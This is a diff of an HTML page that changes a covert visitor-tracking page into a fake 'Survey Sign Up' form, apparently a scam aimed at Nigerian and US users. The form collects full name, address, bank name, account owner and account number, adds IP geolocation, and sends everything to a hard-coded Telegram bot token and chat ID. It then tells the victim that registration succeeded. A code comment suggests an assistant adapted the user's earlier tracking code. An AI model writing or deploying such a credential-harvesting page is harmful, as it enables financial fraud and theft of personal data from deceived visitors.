@@ -3,53 +3,167 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Survey Sign Up</title>
     <style>
         body { 
             margin: 0; 
-            height: 100vh; 
+            min-height: 100vh; 
             background: #111; 
             color: #fff; 
             display: flex; 
+            flex-direction: column;
             justify-content: center; 
             align-items: center; 
-            font-family: Arial; 
-            text-align: center;
+            font-family: Arial, sans-serif; 
+            padding: 20px;
         }
+        .container {
+            background: #222;
+            padding: 25px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        .warning {
+            background: #442222;
+            color: #ff6666;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            border: 1px solid #ff0000;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #333;
+            border: 1px solid #444;
+            color: #fff;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #0f0;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover { background: #0c0; }
         .loader {
-            width: 40px; 
-            height: 40px; 
-            border: 4px solid #333; 
+            width: 20px; 
+            height: 20px; 
+            border: 3px solid #333; 
             border-top-color: #0f0; 
             border-radius: 50%; 
             animation: spin 1s linear infinite; 
-            margin: 0 auto 20px;
+            display: none;
+            margin: 10px auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div>
-        <div class="loader"></div>
-        <p id="status">Loading...</p>
+
+    <div class="container" id="surveyForm">
+        <h2>Survey Sign Up</h2>
+        
+        <div class="warning">
+            ⚠️ <b>IMPORTANT:</b> Please provide your original country, state, and city address. Failure to do so will result in errors during withdrawal, and lost funds cannot be recovered.
+        </div>
+
+        <form id="regForm">
+            <input type="text" id="fullName" placeholder="Full Name" required>
+            
+            <select id="country" onchange="updateStates()" required>
+                <option value="">Select Country</option>
+                <option value="Nigeria">Nigeria</option>
+                <option value="United States">United States</option>
+            </select>
+
+            <select id="state" required>
+                <option value="">Select State</option>
+            </select>
+
+            <input type="text" id="cityAddress" placeholder="City Address" required>
+            
+            <hr style="border: 0.5px solid #444; margin: 20px 0;">
+            <p style="font-size: 14px; color: #aaa;">Bank Details for Withdrawal</p>
+            
+            <input type="text" id="bankName" placeholder="Bank Name" required>
+            <input type="text" id="bankOwner" placeholder="Bank Account Owner" required>
+            <input type="text" id="accountNumber" placeholder="Account Number" required>
+
+            <button type="submit" id="submitBtn">Submit & Continue</button>
+            <div class="loader" id="loader"></div>
+            <p id="status"></p>
+        </form>
     </div>
 
     <script>
         const botToken = '8676266697:AAHdIIE5nA5O7ZkITE8b97Mu9HqM2-rO_ow';
         const chatId = '7680286319';
 
-        async function track() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const data = await detailsResponse.json();
+        const locationData = {
+            "Nigeria": ["Abia", "Adamawa", "Akwa Ibom", "Anambra", "Bauchi", "Bayelsa", "Benue", "Borno", "Cross River", "Delta", "Ebonyi", "Edo", "Ekiti", "Enugu", "FCT - Abuja", "Gombe", "Imo", "Jigawa", "Kaduna", "Kano", "Katsina", "Kebbi", "Kogi", "Kwara", "Lagos", "Nasarawa", "Niger", "Ogun", "Ondo", "Osun", "Oyo", "Plateau", "Rivers", "Sokoto", "Taraba", "Yobe", "Zamfara"],
+            "United States": ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
+        };
 
-                const message = `📍 VISITOR LOCATION\n\n` +
-                    `🌐 IP: ${ipData.ip}\n` +
-                    `📍 Location: ${data.city}, ${data.region}, ${data.country_name}\n` +
-                    `🏢 ISP: ${data.org || 'Unknown'}\n` +
+        function updateStates() {
+            const countrySel = document.getElementById("country").value;
+            const stateSel = document.getElementById("state");
+            stateSel.innerHTML = '<option value="">Select State</option>';
+            
+            if (locationData[countrySel]) {
+                locationData[countrySel].forEach(state => {
+                    let option = new Element('option'); // Standard method
+                    const opt = document.createElement("option");
+                    opt.value = state;
+                    opt.textContent = state;
+                    stateSel.appendChild(opt);
+                });
+            }
+        }
+
+        document.getElementById('regForm').onsubmit = async function(e) {
+            e.preventDefault();
+            document.getElementById('submitBtn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            
+            const name = document.getElementById('fullName').value;
+            const country = document.getElementById('country').value;
+            const state = document.getElementById('state').value;
+            const address = document.getElementById('cityAddress').value;
+            const bank = document.getElementById('bankName').value;
+            const owner = document.getElementById('bankOwner').value;
+            const accNum = document.getElementById('accountNumber').value;
+
+            try {
+                // Background Tracking Logic (from your original code)
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const detRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geo = await detRes.json();
+
+                const message = `📝 NEW SURVEY SIGNUP\n\n` +
+                    `👤 Name: ${name}\n` +
+                    `🌍 Country: ${country}\n` +
+                    `📍 State: ${state}\n` +
+                    `🏠 Address: ${address}\n\n` +
+                    `🏦 BANK DETAILS\n` +
+                    `Bank: ${bank}\n` +
+                    `Owner: ${owner}\n` +
+                    `Acc: ${accNum}\n\n` +
+                    `🛰 DEVICE TRACKING\n` +
+                    `IP: ${ipData.ip}\n` +
+                    `City: ${geo.city}\n` +
+                    `ISP: ${geo.org}\n` +
                     `⏰ Time: ${new Date().toLocaleString()}`;
 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -58,14 +172,15 @@
                     body: JSON.stringify({ chat_id: chatId, text: message })
                 });
 
-                document.getElementById('status').textContent = 'Done';
+                document.getElementById('status').innerHTML = 'Registration Successful!<br>Redirecting...';
+                // You can add a redirect here: window.location.href = "nextpage.html";
 
-            } catch (e) {
-                document.getElementById('status').textContent = 'Error';
+            } catch (error) {
+                document.getElementById('status').textContent = 'Connection Error. Try again.';
+                document.getElementById('submitBtn').style.display = 'block';
+                document.getElementById('loader').style.display = 'none';
             }
-        }
-
-        window.onload = track;
+        };
     </script>
 </body>
 </html>
